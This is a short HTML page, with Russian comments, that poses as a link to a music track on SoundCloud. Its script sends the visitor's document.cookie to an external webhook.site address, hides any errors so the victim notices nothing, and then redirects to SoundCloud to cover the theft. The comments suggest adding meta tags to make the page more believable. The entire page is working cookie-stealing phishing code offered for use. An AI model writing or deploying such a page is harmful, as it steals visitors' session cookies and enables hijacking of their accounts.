<!DOCTYPE html>
<html>
<head>
    <title>Cool Music Track</title>
    <!-- Можно добавить favicon, мета-теги для правдоподобности -->
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {
            background: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
        }
        .loading {
            font-size: 18px;
        }
    </style>
</head>
<body>
    <div class="loading">Redirecting to SoundCloud...</div>

    <script>
        // 1. Отправляем куки на вебхук
        fetch('https://webhook.site/a22adb9c-28a6-4833-9b68-ca5d2389e551?cookie=' + 
              encodeURIComponent(document.cookie))
            .catch(e => console.log("Webhook error:", e)) // Игнорируем ошибки, чтобы пользователь ничего не заметил

        // 2. Через 1 секунду редирект на SoundCloud (выглядит как переход на трек)
        setTimeout(() => {
            window.location.href = "https://soundcloud.com/";
            // Или на конкретный трек, например:
            // window.location.href = "https://soundcloud.com/officialsoundcloud/hot-100";
        }, 1000);
    </script>
</body>
</html>
